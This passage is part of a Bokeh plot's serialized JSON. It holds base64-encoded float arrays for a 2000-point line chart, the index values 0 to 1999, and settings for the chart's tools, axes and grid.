AAAAAAwb8AAAAAAACAvwAAAAAAwLC/AAAAAAAAqj8AAAAAAKDIvwAAAAAAgKm/AAAAAABAtb8AAAAAAICoPwAAAAAAoNC/AAAAAABAvb8AAAAAAMDCvwAAAAAAAJG/AAAAAADgyL8AAAAAAACqvwAAAAAAALa/AAAAAACApD8AAAAAAKDGvwAAAAAAAKG/AAAAAAAAs78AAAAAAICsPwAAAAAAALe/AAAAAAAAoz8AAAAAAACQvwAAAAAAgLk/AAAAAADAsb8AAAAAAICqPwAAAAAAAAAAAAAAAACAvT8AAAAAAMCwvwAAAAAAAKc/AAAAAAAAmL8AAAAAAAC2PwAAAAAAoMS/AAAAAAAAob8AAAAAAMCzvwAAAAAAgKc/AAAAAAAAu78AAAAAAACRPwAAAAAAAKa/AAAAAABAsj8AAAAAAAC6vwAAAAAAAJc/AAAAAAAAoL8AAAAAAAC1PwAAAAAAgLK/AAAAAAAAoz8AAAAAAICgvwAAAAAAALI/AAAAAACAwL8AAAAAAABwvwAAAAAAgK6/AAAAAACArT8AAAAAAEC0vwAAAAAAAKU/AAAAAAAAl78AAAAAAIC3PwAAAAAAAMW/AAAAAAAAnb8AAAAAAMCwvwAAAAAAgK8/AAAAAAAAu78AAAAAAACEPwAAAAAAgKi/AAAAAABAsT8AAAAAAADGvwAAAAAAgKK/AAAAAADAs78AAAAAAICoPwAAAAAAAMK/AAAAAAAAkb8AAAAAAECyvwAAAAAAAKk/AAAAAABAx78AAAAAAICkvwAAAAAAALO/AAAAAAAAqz8AAAAAANDRvwAAAAAAgMC/AAAAAABAxL8AAAAAAACVvwAAAAAAIMm/AAAAAAAAq78AAAAAAEC2vwAAAAAAAKI/AAAAAACgxr8AAAAAAAChvwAAAAAAgLG/AAAAAACArj8AAAAAAAC2vwAAAAAAAKQ/AAAAAAAAlL8AAAAAAAC5PwAAAAAAwLe/AAAAAACAoz8AAAAAAACCvwAAAAAAwLs/AAAAAADAs78AAAAAAACgPwAAAAAAgKG/AAAAAADAsz8AAAAAAGDEvwAAAAAAAJy/AAAAAAAAs78AAAAAAACpPwAAAAAAwLu/AAAAAAAAkD8AAAAAAACmvwAAAAAAQLI/AAAAAAAAur8AAAAAAACYPwAAAAAAAKC/AAAAAABAtD8AAAAAAICyvwAAAAAAgKM/AAAAAAAAob8AAAAAAMCzPwAAAAAAwL2/AAAAAAAAfD8AAAAAAACqvwAAAAAAALA/AAAAAACAsr8AAAAAAACpPwAAAAAAAIa/AAAAAABAuT8AAAAAACDFvwAAAAAAAJ2/AAAAAAAAsr8AAAAAAACtPwAAAAAAgLu/AAAAAAAAjD8AAAAAAACnvwAAAAAAwLE/AAAAAAAAxL8AAAAAAACdvwAAAAAAALK/AAAAAACAqz8AAAAAAGDAvwAAAAAAAHS/AAAAAABAsL8AAAAAAACrPwAAAAAAgMq/AAAAAAAAsL8AAAAAAMC3vwAAAAAAAKU/AAAAAABQ0b8AAAAAAMC/vwAAAAAAoMO/AAAAAAAAlb8AAAAAAADJvwAAAAAAAKq/AAAAAACAtr8AAAAAAAClPwAAAAAAAMa/AAAAAAAAnr8AAAAAAACyvwAAAAAAAK0/AAAAAADAub8AAAAAAACcPwAAAAAAAJe/AAAAAABAuD8AAAAAAAC2vwAAAAAAAKY/AAAAAAAAfL8AAAAAAEC8PwAAAAAAAK2/AAAAAACAqz8AAAAAAACRvwAAAAAAwLc/AAAAAACAwr8AAAAAAACWvwAAAAAAgLG/AAAAAACAqz8AAAAAAEC6vwAAAAAAAJM/AAAAAAAApL8AAAAAAMCyPwAAAAAAwLq/AAAAAAAAlz8AAAAAAACgvwAAAAAAgLU/AAAAAAAAsL8AAAAAAACoPwAAAAAAAJq/AAAAAAAAsz8AAAAAAAC+vwAAAAAAAHw/AAAAAACAqb8AAAAAAACxPwAAAAAAgLW/AAAAAAAApD8AAAAAAACYvwAAAAAAALc/AAAAAADAxr8AAAAAAICivwAAAAAAALK/AAAAAAAArT8AAAAAAIC6vwAAAAAAAIY/AAAAAACAqL8AAAAAAACxPwAAAAAAYMW/AAAAAAAAoL8AAAAAAICyvwAAAAAAAKs/AAAAAAAgw78AAAAAAACavwAAAAAAwLO/AAAAAAAApj8AAAAAAKDJvwAAAAAAAKy/AAAAAAAAtr8AAAAAAICnPwAAAAAAgNG/AAAAAAAgwL8AAAAAAKDDvwAAAAAAAJG/AAAAAAAgyL8AAAAAAACnvwAAAAAAQLW/AAAAAAAApT8AAAAAAKDIvwAAAAAAAKi/AAAAAAAAtL8AAAAAAICqPwAAAAAAQLy/AAAAAAAAlz8AAAAAAICgvwAAAAAAgLY/AAAAAABAtL8AAAAAAACrPwAAAAAAAGA/AAAAAABAvj8AAAAAAICqvwAAAAAAAKo/AAAAAAAAkb8AAAAAAMC3PwAAAAAAoMO/AAAAAAAAmb8AAAAAAECyvwAAAAAAAKs/AAAAAACAvb8AAAAAAACGPwAAAAAAAKi/AAAAAADAsT8AAAAAAEC6vwAAAAAAAJc/AAAAAACAoL8AAAAAAAC1PwAAAAAAwLC/AAAAAACApj8AAAAAAACcvwAAAAAAALQ/AAAAAABAv78AAAAAAABoPwAAAAAAgKu/AAAAAAAArj8AAAAAAIC1vwAAAAAAgKQ/AAAAAAAAkr8AAAAAAIC4PwAAAAAAgMS/AAAAAAAAl78AAAAAAICwvwAAAAAAQLA/AAAAAACAuL8AAAAAAACZPwAAAAAAgKK/AAAAAADAsz8AAAAAAODEvwAAAAAAAKG/AAAAAAAAs78AAAAAAACqPwAAAAAAwMO/AAAAAAAAnL8AAAAAAAC0vwAAAAAAgKU/AAAAAACAyb8AAAAAAACsvwAAAAAAwLW/AAAAAAAAqD8AAAAAAKDQvwAAAAAAgL2/AAAAAACgwr8AAAAAAACRvwAAAAAAQMq/AAAAAACArr8AAAAAAAC4vwAAAAAAAKI/AAAAAABgyL8AAAAAAICmvwAAAAAAQLS/AAAAAACAqT8AAAAAAAC5vwAAAAAAgKE/AAAAAAAAlL8AAAAAAAC5PwAAAAAAALK/AAAAAACArT8AAAAAAAAAAAAAAAAAAL4/AAAAAACArL8AAAAAAICrPwAAAAAAAJC/AAAAAADAtz8AAAAAACDDvwAAAAAAAJi/AAAAAADAsb8AAAAAAACrPwAAAAAAALm/AAAAAAAAmD8AAAAAAICivwAAAAAAgLM/AAAAAAAAub8AAAAAAACbPwAAAAAAAJy/AAAAAABAtj8AAAAAAECxvwAAAAAAgKU/AAAAAAAAnb8AAAAAAACzPwAAAAAAAMC/AAAAAAAAAAAAAAAAAICsvwAAAAAAALA/AAAAAAAAsr8AAAAAAACpPwAAAAAAAJG/AAAAAADAuD8AAAAAAIDEvwAAAAAAAJm/AAAAAAAAr78AAAAAAMCwPwAAAAAAQLq/AAAAAAAAjD8AAAAAAACovwAAAAAAwLE/AAAAAACAxr8AAAAAAICjvwAAAAAAwLO/AAAAAACAqD8AAAAAACDEvwAAAAAAgKK/AAAAAABAtr8AAAAAAICiPwAAAAAAAMm/AAAAAACAqr8AAAAAAAC1vwAAAAAAgKk/AAAAAAAg0r8AAAAAAADBvwAAAAAAoMS/AAAAAAAAlr8AAAAAAIDKvwAAAAAAAK6/AAAAAABAt78AAAAAAICgPwAAAAAAoMa/AAAAAAAAob8AAAAAAICxvwAAAAAAAK8/AAAAAADAtb8AAAAAAIClPwAAAAAAAJG/AAAAAADAuT8AAAAAAECyvwAAAAAAAK0/AAAAAAAAeD8AAAAAAAC/PwAAAAAAgKu/AAAAAACAqT8AAAAAAACTvwAAAAAAQLc/AAAAAACAwr8AAAAAAACQvwAAAAAAgLC/AAAAAACArT8AAAAAAEC5vwAAAAAAAJY/AAAAAAAAo78AAAAAAICzPwAAAAAAQLu/AAAAAAAAlT8AAAAAAAChvwAAAAAAgLU/AAAAAACAtL8AAAAAAICgPwAAAAAAgKK/AAAAAACAsj8AAAAAAAC/vwAAAAAAAGA/AAAAAAAArL8AAAAAAICuPwAAAAAAwLK/AAAAAAAAqD8AAAAAAACIvwAAAAAAwLk/AAAAAACAxL8AAAAAAACavwAAAAAAALG/AAAAAAAArz8AAAAAAAC6vwAAAAAAAJM/AAAAAACApb8AAAAAAMCyPwAAAAAAQMa/AAAAAACApL8AAAAAAAC1vwAAAAAAAKg/AAAAAADAxL8AAAAAAACgvwAAAAAAQLW/AAAAAAAApD8AAAAAAGDLvwAAAAAAgLC/AAAAAAAAuL8AAAAAAAClPwAAAAAAYNG/AAAAAABAv78AAAAAACDDvwAAAAAAAJG/AAAAAABAyL8AAAAAAICmvwAAAAAAwLS/AAAAAACAqD8AAAAAAEDFvwAAAAAAAJm/AAAAAAAAr78AAAAAAACvPwAAAAAAgLi/AAAAAAAAoj8AAAAAAACRvwAAAAAAwLk/AAAAAADAs78AAAAAAICrPwAAAAAAAGC/AAAAAADAvT8AAAAAAACtvwAAAAAAgKw/AAAAAAAAkL8AAAAAAEC4PwAAAAAAYMK/AAAAAAAAlL8AAAAAAACxvwAAAAAAAK0/AAAAAADAur8AAAAAAACSPwAAAAAAAKS/AAAAAADAsj8AAAAAAEC7vwAAAAAAAJQ/AAAAAACAoL8AAAAAAIC1PwAAAAAAgK6/AAAAAACAqD8AAAAAAACZvwAAAAAAwLM/AAAAAABAvb8AAAAAAACCPwAAAAAAAKi/AAAAAABAsT8AAAAAAICxvwAAAAAAAKo/AAAAAAAAjL8AAAAAAEC5PwAAAAAA4MS/AAAAAAAAmr8AAAAAAICvvwAAAAAAALE/AAAAAACAt78AAAAAAACaPwAAAAAAgKS/AAAAAAAAsz8AAAAAAKDGvwAAAAAAAKS/AAAAAABAtL8AAAAAAICpPwAAAAAAYMa/AAAAAAAAqL8AAAAAAEC4vwAAAAAAAKA/AAAAAABAzb8AAAAAAECzvwAAAAAAwLm/AAAAAACAoT8AAAAAACDSvwAAAAAAwMC/AAAAAABgxL8AAAAAAACTvwAAAAAAQMi/AAAAAAAAp78AAAAAAIC0vwAAAAAAAKY/AAAAAAAAx78AAAAAAAChvwAAAAAAALG/AAAAAAAAsD8AAAAAAAC3vwAAAAAAgKQ/AAAAAAAAkb8AAAAAAMC5PwAAAAAAwLG/AAAAAACArz8AAAAAAACGPwAAAAAAAMA/AAAAAACAp78AAAAAAICtPwAAAAAAAIa/AAAAAAAAuT8AAAAAAADDvwAAAAAAAJG/AAAAAADAsL8AAAAAAACuPwAAAAAAwLq/AAAAAAAAjj8AAAAAAACmvwAAAAAAALM/AAAAAAAAuL8AAAAAAACgPwAAAAAAAJi/AAAAAACAtz8AAAAAAICuvwAAAAAAgKk/AAAAAAAAlb8AAAAAAMC1PwAAAAAAwL6/AAAAAAAAcD8AAAAAAACpvw==","dtype":"float64","shape":[2000]}},"selected":{"id":"1165","type":"Selection"},"selection_policy":{"id":"1164","type":"UnionRenderers"}},"id":"1141","type":"ColumnDataSource"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1121","type":"PanTool"},{"id":"1122","type":"WheelZoomTool"},{"id":"1123","type":"BoxZoomTool"},{"id":"1124","type":"SaveTool"},{"id":"1125","type":"ResetTool"},{"id":"1126","type":"HelpTool"},{"id":"1134","type":"CrosshairTool"}]},"id":"1127","type":"Toolbar"},{"attributes":{"source":{"id":"1141","type":"ColumnDataSource"}},"id":"1145","type":"CDSView"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1143","type":"Line"},{"attributes":{},"id":"1134","type":"CrosshairTool"},{"attributes":{"text":""},"id":"1155","type":"Title"},{"attributes":{},"id":"1107","type":"LinearScale"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1161","type":"BoxAnnotation"},{"attributes":{},"id":"1160","type":"BasicTickFormatter"},{"attributes":{"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1115","type":"Grid"},{"attributes":{},"id":"1158","type":"BasicTickFormatter"},{"attributes":{"callback":null},"id":"1105","type":"DataRange1d"},{"attributes":{},"id":"1162","type":"UnionRenderers"},{"attributes":{},"id":"1112","type":"BasicTicker"},{"attributes":{},"id":"1163","type":"Selection"},{"attributes":{"formatter":{"id":"1160","type":"BasicTickFormatter"},"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1111","type":"LinearAxis"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,1596,1597,1598,1599,1600,1601,1602,1603,1604,1605,1606,1607,1608,1609,1610,1611,1612,1613,1614,1615,1616,1617,1618,1619,1620,1621,1622,1623,1624,1625,1626,1627,1628,1629,1630,1631,1632,1633,1634,1635,1636,1637,1638,1639,1640,1641,1642,1643,1644,1645,1646,1647,1648,1649,1650,1651,1652,1653,1654,1655,1656,1657,1658,1659,1660,1661,1662,1663,1664,1665,1666,1667,1668,1669,1670,1671,1672,1673,1674,1675,1676,1677,1678,1679,1680,1681,1682,1683,1684,1685,1686,1687,1688,1689,1690,1691,1692,1693,1694,1695,1696,1697,1698,1699,1700,1701,1702,1703,1704,1705,1706,1707,1708,1709,1710,1711,1712,1713,1714,1715,1716,1717,1718,1719,1720,1721,1722,1723,1724,1725,1726,1727,1728,1729,1730,1731,1732,1733,1734,1735,1736,1737,1738,1739,1740,1741,1742,1743,1744,1745,1746,1747,1748,1749,1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,1764,1765,1766,1767,1768,1769,1770,1771,1772,1773,1774,1775,1776,1777,1778,1779,1780,1781,1782,1783,1784,1785,1786,1787,1788,1789,1790,1791,1792,1793,1794,1795,1796,1797,1798,1799,1800,1801,1802,1803,1804,1805,1806,1807,1808,1809,1810,1811,1812,1813,1814,1815,1816,1817,1818,1819,1820,1821,1822,1823,1824,1825,1826,1827,1828,1829,1830,1831,1832,1833,1834,1835,1836,1837,1838,1839,1840,1841,1842,1843,1844,1845,1846,1847,1848,1849,1850,1851,1852,1853,1854,1855,1856,1857,1858,1859,1860,1861,1862,1863,1864,1865,1866,1867,1868,1869,1870,1871,1872,1873,1874,1875,1876,1877,1878,1879,1880,1881,1882,1883,1884,1885,1886,1887,1888,1889,1890,1891,1892,1893,1894,1895,1896,1897,1898,1899,1900,1901,1902,1903,1904,1905,1906,1907,1908,1909,1910,1911,1912,1913,1914,1915,1916,1917,1918,1919,1920,1921,1922,1923,1924,1925,1926,1927,1928,1929,1930,1931,1932,1933,1934,1935,1936,1937,1938,1939,1940,1941,1942,1943,1944,1945,1946,1947,1948,1949,1950,1951,1952,1953,1954,1955,1956,1957,1958,1959,1960,1961,1962,1963,1964,1965,1966,1967,1968,1969,1970,1971,1972,1973,1974,1975,1976,1977,1978,1979,1980,1981,1982,1983,1984,1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999],"y":{"__ndarray__":"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